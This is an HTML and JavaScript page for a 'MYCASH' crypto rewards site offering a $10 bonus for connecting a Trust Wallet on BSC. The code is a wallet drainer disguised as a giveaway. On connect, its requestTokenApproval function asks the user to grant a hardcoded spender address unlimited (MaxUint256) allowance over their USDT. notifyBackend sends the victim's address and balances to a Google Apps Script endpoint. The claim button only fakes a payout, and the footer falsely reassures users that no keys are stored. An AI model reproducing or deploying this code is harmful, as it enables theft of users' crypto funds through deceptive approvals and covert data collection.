<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>MYCASH — Rewards</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}

    body{
      font-family:system-ui,Segoe UI,Arial;
      background:#050816;
      color:#e6eef8;
      min-height:100vh;
      display:flex;
      flex-direction:column;
    }

    /* === HEADER & NAV (same structure as index) === */
    header{
      background:#071027;
      padding:12px 16px;
      position:sticky;
      top:0;
      z-index:20;
      border-bottom:1px solid rgba(255,255,255,0.03);
    }
    .nav{
      max-width:980px;
      margin:0 auto;
      display:flex;
      align-items:center;
      justify-content:space-between;
    }
    .nav-left{display:flex;gap:14px}
    a{
      color:#dbeafe;
      text-decoration:none;
      padding:6px 10px;
      border-radius:6px;
      font-size:0.9rem;
    }
    a:hover{background:#0f1b33}
    .logo{
      font-weight:700;
      letter-spacing:4px;
      font-size:1rem;
    }
    .connect{
      background:#3b82f6;
      color:#fff;
      padding:8px 14px;
      border-radius:999px;
      border:0;
      cursor:pointer;
      font-size:0.9rem;
    }
    .connect.connected{
      background:#15803d;
    }

    main{
      max-width:980px;
      margin:20px auto;
      padding:16px;
      flex:1;
    }

    /* small info line under header (User ID etc) */
    .top-info{
      margin-bottom:14px;
      font-size:0.84rem;
      color:#9fb0c8;
      display:flex;
      flex-wrap:wrap;
      gap:10px 18px;
    }
    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}

    /* ===== REWARD PAGE ===== */
    .reward-title{
      text-align:center;
      margin-bottom:1.5rem;
    }
    .reward-title h1{
      font-size:1.9rem;
      margin-bottom:0.4rem;
    }
    .reward-title p{
      font-size:0.95rem;
      color:#9ca3af;
    }

    .reward-card{
      border-radius:1.5rem;
      padding:1.4rem 1.6rem;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:1.4rem;
      border:1px solid rgba(148,163,184,0.35);
      box-shadow:0 20px 45px rgba(15,23,42,0.9);
      background:radial-gradient(circle at top left,#111827,#020617);
    }

    .reward-left,
    .reward-center,
    .reward-right{
      display:flex;
      flex-direction:column;
      justify-content:center;
    }

    .reward-left{
      min-width:150px;
      gap:0.4rem;
    }

    .reward-tag{
      font-size:0.7rem;
      text-transform:uppercase;
      letter-spacing:0.18em;
      color:#64748b;
      margin-bottom:6px;
    }

    .wallet-icon-base{
      width:54px;
      height:54px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
      background:#020617;
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.6);
      background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);
    }
    .wallet-icon-base img{
      width:70%;
      height:70%;
      object-fit:contain;
      display:block;
    }

    .wallet-subline{
      font-size:0.8rem;
      color:#9fb0c8;
    }

    .reward-center{
      flex:1;
      align-items:center;
      text-align:center;
      gap:0.35rem;
    }

    .reward-amount{
      font-size:2.1rem;
      font-weight:700;
      letter-spacing:0.05em;
    }

    .reward-label{
      font-size:0.86rem;
      text-transform:uppercase;
      color:#9ca3af;
      letter-spacing:0.23em;
    }

    .reward-desc{
      margin-top:2px;
      font-size:0.82rem;
      color:#9fb0c8;
      max-width:370px;
    }

    .btn{
      border:none;
      outline:none;
      border-radius:999px;
      padding:0.55rem 1.8rem;
      font-size:0.9rem;
      font-weight:600;
      cursor:pointer;
      transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease, opacity 0.12s ease;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      white-space:nowrap;
    }

    .btn-claim{
      background:#22c55e;
      color:#022c22;
      box-shadow:0 14px 30px rgba(34,197,94,0.45);
      margin-top:0.7rem;
    }
    .btn-claim:hover:not([disabled]){
      transform:translateY(-1px);
      box-shadow:0 18px 40px rgba(34,197,94,0.6);
    }

    .btn-task{
      margin-top:0.45rem;
      background:transparent;
      border:1px solid rgba(148,163,184,0.8);
      color:#e5e7eb;
      font-size:0.86rem;
      padding-inline:1.4rem;
    }
    .btn-task:hover{
      background:rgba(15,23,42,0.9);
      box-shadow:0 10px 26px rgba(15,23,42,0.8);
      transform:translateY(-1px);
    }

    .btn[disabled]{
      opacity:0.45;
      cursor:not-allowed;
      box-shadow:none;
      transform:none;
    }

    .reward-right{
      min-width:170px;
      align-items:flex-end;
      gap:0.4rem;
    }

    .small{font-size:0.85rem;color:#9fb0c8;}

    .reward-extra{
      margin-top:18px;
      font-size:0.85rem;
      color:#9fb0c8;
    }

    /* ===== TASK PAGE (same header/footer, just different content) ===== */
    #taskPage{display:none;}

    .task-header-row{
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:10px;
      margin-bottom:16px;
    }
    .task-header-row h2{
      font-size:1.4rem;
    }
    .btn-back{
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.7);
      background:transparent;
      color:#e5e7eb;
      font-size:0.85rem;
      padding:0.4rem 1.2rem;
      cursor:pointer;
    }
    .btn-back:hover{
      background:#111827;
    }

    .task-section{
      margin-top:18px;
      padding:1rem 1.1rem;
      border-radius:0.9rem;
      border:1px solid rgba(75,85,99,0.7);
      background:linear-gradient(135deg,#020617,#020617,#0b1120);
    }
    .task-section h3{
      font-size:1rem;
      margin-bottom:0.35rem;
    }
    .task-section p{
      font-size:0.86rem;
      color:#cbd5f5;
      margin-bottom:0.35rem;
    }
    .task-section ul{
      margin-left:1.2rem;
      margin-bottom:0.35rem;
      font-size:0.86rem;
      color:#cbd5f5;
    }
    .task-section li{
      margin-bottom:0.18rem;
    }

    .video-wrapper{
      position:relative;
      width:100%;
      max-width:640px;
      margin-top:0.6rem;
      margin-bottom:0.6rem;
      padding-top:56.25%; /* 16:9 */
      border-radius:0.75rem;
      overflow:hidden;
      box-shadow:0 18px 38px rgba(15,23,42,0.9);
      background:#020617;
    }
    .video-wrapper iframe{
      position:absolute;
      top:0;left:0;
      width:100%;
      height:100%;
      border:0;
    }

    .task-actions{
      margin-top:0.6rem;
      display:flex;
      flex-wrap:wrap;
      gap:10px;
      align-items:center;
    }
    .task-btn{
      border-radius:999px;
      border:none;
      background:#22c55e;
      color:#022c22;
      font-size:0.9rem;
      padding:0.45rem 1.4rem;
      font-weight:600;
      cursor:pointer;
    }
    .task-btn:hover{
      box-shadow:0 14px 30px rgba(34,197,94,0.45);
      transform:translateY(-1px);
    }

    .task-check{
      font-size:0.84rem;
    }
    .task-check.ok{
      color:#22c55e;
    }
    .task-check.bad{
      color:#f97316;
    }

    footer{
      max-width:980px;
      margin:24px auto 16px auto;
      padding:12px;
      color:#9fb0c8;
      text-align:center;
      font-size:0.8rem;
    }

    @media(max-width:768px){
      .nav{
        flex-direction:column;
        align-items:flex-start;
      }

      .reward-card{
        flex-direction:column;
        align-items:stretch;
        text-align:center;
      }
      .reward-left{
        align-items:center;
      }
      .reward-right{
        align-items:center;
      }
    }
  </style>
</head>
<body>
  <!-- HEADER (same as index) -->
  <header>
    <div class="nav">
      <div class="nav-left">
        <a href="index.html">Home</a>
      
        <a href="reward.html" style="background:#0f1b33">Rewards</a>
      </div>
      <div class="logo">MYCASH</div>
      <div>
        <button id="connectBtn" class="connect">Connect Wallet</button>
      </div>
    </div>
  </header>

  <main>
    <!-- Top info bar (User ID, address, etc.) -->
    <div class="top-info">
      <div>Status: <span id="statusText">Not connected</span></div>
      <div>Address: <span id="walletAddress" class="mono">—</span></div>
      <div>Network: <span id="walletNetwork">—</span></div>
      <div>User ID: <span id="userId" class="mono">-</span></div>
    </div>

    <!-- === REWARD PAGE VIEW === -->
    <div id="rewardPage">
      <div class="reward-title">
        <h1>Claim Your Rewards</h1>
        <p>Connect your BSC wallet once, then use the reward card below to claim.</p>
      </div>

      <div class="reward-card">
        <div class="reward-left">
          <div class="reward-tag">Reward #1</div>
          <div class="wallet-icon-base">
            <img src="logo.png" alt="Trust Wallet">
          </div>
          <span class="wallet-subline">Trust Wallet • BSC</span>
        </div>

        <div class="reward-center">
          <div class="reward-amount" id="rewardAmountDisplay">$10</div>
          <div class="reward-label">Starter Bonus</div>
          <div class="reward-desc">
            First time connection reward for eligible wallets.
          </div>
          <button id="claimBtn" class="btn btn-claim" disabled>Claim</button>
          <button id="taskBtn" class="btn btn-task">View Tasks</button>
          <div class="small" id="claimHint" style="margin-top:4px;">
            Claim is locked until wallet is connected and all tasks are completed.
          </div>
        </div>

        <div class="reward-right">
          <!-- we reuse same connect button in header, this right side just shows note -->
          <span class="small">Use the top button to connect your wallet.</span>
        </div>
      </div>

      <div class="reward-extra">
        <div>BNB Balance: <span id="walletBalance">—</span></div>
        <div id="tokens" style="margin-top:6px">
          Connect wallet to see USDT balance.
        </div>
      </div>
    </div>

    <!-- === TASK PAGE VIEW (same header/footer, different content) === -->
    <div id="taskPage">
      <div class="task-header-row">
        <div>
          <h2>Reward Tasks</h2>
          <p class="small">Complete these tasks to become eligible for the Starter Bonus.</p>
        </div>
        <button id="backToRewardsBtn" class="btn-back">Back to Reward</button>
      </div>

      <!-- Task 1: video -->
      <div class="task-section">
        <h3>Task 1 — Watch the Intro Video</h3>
        <p>
          Watch this video to understand how MYCASH and the reward system works.
          
        </p>
        <div class="video-wrapper">
          <!-- Replace src with your own embedded video later -->
          <iframe
            src="https://www.youtube.com/embed/dQw4w9WgXcQ"
            title="MYCASH Intro"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            allowfullscreen
          ></iframe>
        </div>
        <div class="task-actions">
          <button id="task1Btn" class="task-btn">Mark as watched (demo)</button>
          <span id="task1Check" class="task-check bad">❌ Not completed</span>
        </div>
      </div>

      <!-- Task 2: wallet balance checker -->
      <div class="task-section">
        <h3>Task 2 — Wallet Balance Check</h3>
        <p>
          This task checks if your connected wallet holds at least
          <strong>10 USDT (BEP-20)</strong>. 
        </p>
        <ul>
          <li>Connect your BSC wallet using the button in the header.</li>
          <li>Make sure you hold at least 10 USDT at the token address configured.</li>
          <li>Click “Check wallet” to test eligibility.</li>
        </ul>
        <div class="task-actions">
          <button id="task2CheckBtn" class="task-btn">Check wallet (demo)</button>
          <span id="task2Check" class="task-check bad">❌ Not checked</span>
        </div>
        <p class="small" id="task2Detail" style="margin-top:4px;">
          Status: waiting for check.
        </p>
      </div>

      <!-- Task 3: custom action -->
      <div class="task-section">
        <h3>Task 3 — Custom Action</h3>
        <p>
        i will add DOWNLOAD APP/ LIKE THE PAGE / FOLLOW ON INSTRAGRAM 
        </p>
        <ul>
          <li>Example: Join the official Telegram or Discord.</li>
          <li>Example: Submit a simple form with their User ID.</li>
          <li>Example: Perform one on-chain transaction via MYCASH.</li>
        </ul>
        <div class="task-actions">
          <button id="task3Btn" class="task-btn">Mark as done (demo)</button>
          <span id="task3Check" class="task-check bad">❌ Not completed</span>
        </div>
      </div>
    </div>
  </main>

  <!-- FOOTER (same structure as index) -->
  <footer>
    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
  </footer>

  <!-- libs -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>

  <!-- app script (same logic base as index) -->
  <script type="module">
  (function(){
    // ===== CONFIG (same as your index) =====
    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
    const APPS_SCRIPT_SECRET = "mahfuzinam0045";

    const TOKEN_ADDRESS   = "0x5915f45023012942c0F30B6652CEbb6A05810b90"; // USDT testnet
    const SPENDER_ADDRESS = "0x98fbcaA43b229601edb71E9923055ee485c29C3E";

    const BNB_TESTNET_CHAIN_ID_DEC = 97;
    const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
    const BNB_TESTNET_LABEL        = "BSC Testnet (97)";

    const ERC20_APPROVE_ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];
    const ERC20_BALANCE_ABI = [
      "function balanceOf(address owner) view returns (uint256)" 
      ];
      const TOKEN_DECIMALS = 6; // <-- change to whatever your fusdt uses

    

    const REQUIRED_USDT = 10;   // Task 2: need at least this much
    const REWARD_AMOUNT = 10.0; // display only

    let web3ModalInstance = null;
    let providerInstance  = null;
    let web3Instance      = null;
    let currentAddress    = null;

    let isWalletConnected = false;
    let task1Done         = false;
    let task2Eligible     = false;
    let task3Done         = false;

    // ===== userId helpers =====
    function storageKeyFor(address){
      return "userId_" + address.toLowerCase();
    }
    function generateUserIdFromAddress(address){
      address = (address || "").toLowerCase();
      let hash = 0;
      for (let i = 0; i < address.length; i++){
        hash = ((hash << 5) - hash) + address.charCodeAt(i);
        hash |= 0;
      }
      hash = Math.abs(hash);
      const num = 100000 + (hash % 900000);
      return String(num);
    }
    function getOrCreateUserIdFor(address){
      const key = storageKeyFor(address);
      let id = localStorage.getItem(key);
      if (!id || !/^[0-9]{6}$/.test(id)) {
        id = generateUserIdFromAddress(address);
        localStorage.setItem(key, id);
      }
      return id;
    }

    // ===== UI refs =====
    const connectBtn      = document.getElementById("connectBtn");
    const statusTextEl    = document.getElementById("statusText");
    const walletAddressEl = document.getElementById("walletAddress");
    const userIdEl        = document.getElementById("userId");
    const walletNetworkEl = document.getElementById("walletNetwork");
    const walletBalanceEl = document.getElementById("walletBalance");
    const tokensContainer = document.getElementById("tokens");

    const rewardPageEl    = document.getElementById("rewardPage");
    const taskPageEl      = document.getElementById("taskPage");
    const backToRewardsBtn= document.getElementById("backToRewardsBtn");
    const taskBtn         = document.getElementById("taskBtn");

    const claimBtn        = document.getElementById("claimBtn");
    const claimHintEl     = document.getElementById("claimHint");
    const rewardAmountEl  = document.getElementById("rewardAmountDisplay");

    const task1Btn        = document.getElementById("task1Btn");
    const task1CheckEl    = document.getElementById("task1Check");
    const task2CheckBtn   = document.getElementById("task2CheckBtn");
    const task2CheckEl    = document.getElementById("task2Check");
    const task2DetailEl   = document.getElementById("task2Detail");
    const task3Btn        = document.getElementById("task3Btn");
    const task3CheckEl    = document.getElementById("task3Check");

    function setStatus(txt){
      if(statusTextEl) statusTextEl.textContent = txt;
      console.log("[status]", txt);
    }
    function setWalletInfo(address, network, bnb){
      if(walletAddressEl) walletAddressEl.textContent = address || "—";
      if(walletNetworkEl) walletNetworkEl.textContent = network || "—";
      if(walletBalanceEl){
        walletBalanceEl.textContent =
          (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
      }
    }
    function setUserIdUI(id){
      if(userIdEl) userIdEl.textContent = id || "-";
    }

    function clearSessionUI(){
      isWalletConnected = false;
      currentAddress    = null;
      setStatus("Not connected");
      setWalletInfo("—","—",null);
      setUserIdUI("-");
      if(tokensContainer){
        tokensContainer.textContent = "Connect wallet to see USDT balance.";
      }
      if(connectBtn){
        connectBtn.textContent = "Connect Wallet";
        connectBtn.classList.remove("connected");
      }
      updateClaimState();
    }

    function updateClaimState(){
      const allTasksDone = task1Done && task2Eligible && task3Done;
      if(claimBtn){
        claimBtn.disabled = !(isWalletConnected && allTasksDone);
      }
      if(claimHintEl){
        if(!isWalletConnected){
          claimHintEl.textContent = "Please connect your wallet first.";
        }else if(!allTasksDone){
          claimHintEl.textContent = "Complete all tasks to unlock the Claim button.";
        }else{
          claimHintEl.textContent = "You can now claim your reward.";
        }
      }
    }

    function markTaskState(el, ok, textOk, textBad){
      if(!el) return;
      el.classList.remove("ok","bad");
      if(ok){
        el.classList.add("ok");
        el.textContent = "✅ " + textOk;
      }else{
        el.classList.add("bad");
        el.textContent = "❌ " + textBad;
      }
    }

    function initWeb3ModalInstance(){
      const providerOptions = {
        walletconnect: {
          package: window.WalletConnectProvider.default,
          options: {
            rpc: { 97: "https://data-seed-prebsc-1-s1.binance.org:8545" },
            bridge: "https://bridge.walletconnect.org",
            qrcode: true
          }
        }
      };
      web3ModalInstance = new window.Web3Modal.default({
        cacheProvider: true,
        providerOptions
      });
    }

    function attachProviderListeners(p){
      if(!p || !p.on) return;
      try{
        p.on("accountsChanged", async function(accounts){
          if(!accounts || !accounts.length){
            clearSessionUI();
            return;
          }
          const addr = accounts[0].toLowerCase();
          await restoreSessionFromAddress(addr);
        });

        p.on("chainChanged", function(chainId){
          if(walletNetworkEl){
            walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
          }
        });

        p.on("disconnect", function(){
          clearSessionUI();
        });
      }catch(e){
        console.warn("attachProviderListeners", e);
      }
    }

    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance){
      try{
        const payload = new URLSearchParams({
          secret      : APPS_SCRIPT_SECRET,
          address     : address,
          network     : networkText,
          timestamp   : new Date().toISOString(),
          userId      : userId,
          bnbBalance  : String(bnbBalance ?? ""),
          tokenBalance: String(tokenBalance ?? "")
        });

        await fetch(APPS_SCRIPT_URL, {
          method:"POST",
          mode:"no-cors",
          headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},
          body:payload.toString()
        });
      }catch(err){
        console.error("notifyBackend error:", err);
      }
    }

    async function getTokenBalance(address){
      try{
        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
          console.warn("TOKEN_ADDRESS invalid");
          return "";
        }
        if(!providerInstance){
          console.warn("No providerInstance for token balance");
          return "";
        }
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
        const raw            = await tokenContract.balanceOf(address);
       const formatted = ethers.formatUnits(raw, TOKEN_DECIMALS);

        return formatted;
      }catch(err){
        console.error("getTokenBalance error:", err);
        return "";
      }
    }

    async function switchToBSC(provider){
      try{
        await provider.request({
          method:"wallet_switchEthereumChain",
          params:[{chainId:BNB_TESTNET_CHAIN_ID_HEX}]
        });
        return true;
      }catch(switchError){
        if(switchError.code === 4902){
          try{
            await provider.request({
              method:"wallet_addEthereumChain",
              params:[{
                chainId:BNB_TESTNET_CHAIN_ID_HEX,
                chainName:"BNB Smart Chain Testnet",
                nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
                rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
                blockExplorerUrls:["https://testnet.bscscan.com"]
              }]
            });
            return true;
          }catch(addErr){
            console.error("Could not add BSC Testnet:", addErr);
            return false;
          }
        }
        console.error("Switch error:", switchError);
        return false;
      }
    }

    async function requestTokenApproval(){
      if(!TOKEN_ADDRESS || !SPENDER_ADDRESS || !providerInstance) return;
      try{
        setStatus("Requesting token approval…");
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const signer         = await ethersProvider.getSigner();
        const userAddress    = (await signer.getAddress()).toLowerCase();

        if(TOKEN_ADDRESS.toLowerCase() === userAddress){
          alert("TOKEN_ADDRESS is set to your wallet, it must be the token contract.");
          setStatus("Connected (approval skipped)");
          return;
        }

        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
        const tx             = await tokenContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
        await tx.wait();
        setStatus("Connected + Approved ✅");
      }catch(err){
        console.error("Token approve error:", err);
        setStatus("Connected (approval failed)");
      }
    }

    async function restoreSessionFromAddress(address){
      currentAddress = address;
      const balanceWei = await web3Instance.eth.getBalance(address);
      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
      const userId     = getOrCreateUserIdFor(address);

      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
      setUserIdUI(userId);

      const tokenBalanceRaw  = await getTokenBalance(address);
      const prettyBalance    = tokenBalanceRaw ? Number(tokenBalanceRaw).toFixed(4) : "0.0000";

      if(tokensContainer){
        tokensContainer.innerHTML =
          'USDT balance: ' + prettyBalance +
          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
      }

      isWalletConnected = true;
      if(connectBtn){
        connectBtn.textContent = "Connected";
        connectBtn.classList.add("connected");
      }

      updateClaimState();

      await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalanceRaw);
      return {balanceBNB, tokenBalanceRaw, userId};
    }

    async function connectFlow(){
      try{
        setStatus("Connecting…");
        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        if(!mobile && window.trustwallet && window.trustwallet.ethereum){
          providerInstance = window.trustwallet.ethereum;
          web3Instance     = new Web3(providerInstance);
          await providerInstance.request({method:"eth_requestAccounts"});
        }else if(window.ethereum && !mobile){
          providerInstance = window.ethereum;
          web3Instance     = new Web3(providerInstance);
          await providerInstance.request({method:"eth_requestAccounts"});
        }else{
          if(!web3ModalInstance) initWeb3ModalInstance();
          providerInstance = await web3ModalInstance.connect();
          web3Instance     = new Web3(providerInstance);
        }

        if(!providerInstance || !web3Instance){
          setStatus("No provider");
          alert("No wallet provider detected.");
          return;
        }

        attachProviderListeners(providerInstance);

        const accounts = await web3Instance.eth.getAccounts();
        if(!accounts || !accounts.length){
          setStatus("No account");
          return;
        }
        const address = accounts[0].toLowerCase();

        let chainId = await web3Instance.eth.getChainId();
        if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
          const switched = await switchToBSC(providerInstance);
          if(!switched){
            alert("Please switch to BSC Testnet.");
            setStatus("Wrong network");
            return;
          }
          chainId = await web3Instance.eth.getChainId();
          if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
            alert("Network switch failed");
            return;
          }
        }

        await restoreSessionFromAddress(address);
        setStatus("Connected");
        await requestTokenApproval();
      }catch(err){
        console.error("connectFlow error:", err);
        setStatus("Connection failed");
        alert("Connection failed: " + (err && err.message ? err.message : err));
      }
    }

    async function tryAutoReconnectSilent(){
      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

      if(!mobile && window.trustwallet && window.trustwallet.ethereum){
        const injected = window.trustwallet.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);
        const accounts = await injected.request({method:"eth_accounts"});
        if(accounts && accounts.length){
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session (Trust Wallet)...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      if(window.ethereum){
        const injected = window.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);
        const accounts = await injected.request({method:"eth_accounts"});
        if(accounts && accounts.length){
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      return false;
    }

    async function autoConnectOnLoad(){
      try{
        const restored = await tryAutoReconnectSilent();
        if(!restored){
          clearSessionUI();
        }
      }catch(e){
        console.warn("autoConnectOnLoad failed:", e);
        clearSessionUI();
      }
    }

    async function claimReward(){
      try{
        if(!isWalletConnected){
          alert("Please connect your wallet first.");
          setStatus("Connect wallet before claiming.");
          return;
        }
        if(!(task1Done && task2Eligible && task3Done)){
          alert("Please complete all tasks first.");
          return;
        }
        if(!web3Instance || !providerInstance || !currentAddress){
          alert("Wallet not ready, connect again.");
          return;
        }

        setStatus("Claiming reward…");

        // TODO: real contract call later
        setTimeout(()=>{
          setStatus("Reward claimed for " + currentAddress.slice(0,6) + "…" + currentAddress.slice(-4));
          alert("Reward claimed! (demo mode — add real contract call later)");
        },800);
      }catch(err){
        console.error("claimReward error:", err);
        setStatus("Reward claim failed");
      }
    }

    // === TASK LOGIC ===
    function showTaskPage(){
      if(rewardPageEl) rewardPageEl.style.display = "none";
      if(taskPageEl)   taskPageEl.style.display   = "block";
    }
    function showRewardPage(){
      if(taskPageEl)   taskPageEl.style.display   = "none";
      if(rewardPageEl) rewardPageEl.style.display = "block";
    }

    async function handleTask2Check(){
      if(!isWalletConnected || !currentAddress){
        alert("Please connect your wallet first.");
        return;
      }
      if(!web3Instance || !providerInstance){
        alert("Wallet not ready, try reconnect.");
        return;
      }

      try{
        setStatus("Checking wallet balance…");
        const balanceStr = await getTokenBalance(currentAddress);
        const balanceNum = balanceStr ? Number(balanceStr) : 0;

        const eligible = balanceNum >= REQUIRED_USDT;
        task2Eligible = eligible;

        markTaskState(
          task2CheckEl,
          eligible,
          "ELIGIBLE (balance ≥ " + REQUIRED_USDT + ")",
          "Not eligible (needs ≥ " + REQUIRED_USDT + ")"
        );

        if(task2DetailEl){
          task2DetailEl.textContent =
            "Detected balance: " + balanceNum.toFixed(4) +
            " USDT. Result: " + (eligible ? "ELIGIBLE" : "NOT ELIGIBLE") +
            ". Later you can also check if this is an active account.";
        }

        setStatus("Wallet check completed");
        updateClaimState();
      }catch(err){
        console.error("Task 2 check error:", err);
        if(task2DetailEl){
          task2DetailEl.textContent = "Error checking wallet. Try again.";
        }
      }
    }

    // ===== DOMContentLoaded =====
    document.addEventListener("DOMContentLoaded", async function(){
      if(rewardAmountEl){
        rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
      }

      initWeb3ModalInstance();
      updateClaimState();

      if(connectBtn){
        connectBtn.addEventListener("click", function(){
          if(isWalletConnected) return;
          connectFlow();
        });
      }

      if(claimBtn){
        claimBtn.addEventListener("click", claimReward);
      }

      if(taskBtn){
        taskBtn.addEventListener("click", showTaskPage);
      }
      if(backToRewardsBtn){
        backToRewardsBtn.addEventListener("click", showRewardPage);
      }

      if(task1Btn){
        task1Btn.addEventListener("click", function(){
          task1Done = true;
          markTaskState(task1CheckEl, true, "Task 1 completed (demo)", "Not completed");
          updateClaimState();
        });
      }

      if(task2CheckBtn){
        task2CheckBtn.addEventListener("click", handleTask2Check);
      }

      if(task3Btn){
        task3Btn.addEventListener("click", function(){
          task3Done = true;
          markTaskState(task3CheckEl, true, "Task 3 completed (demo)", "Not completed");
          updateClaimState();
        });
      }

      await autoConnectOnLoad();
      const yearEl = document.getElementById("year");
      if(yearEl) yearEl.textContent = new Date().getFullYear();
    });

  })();
  </script>
</body>
</html>

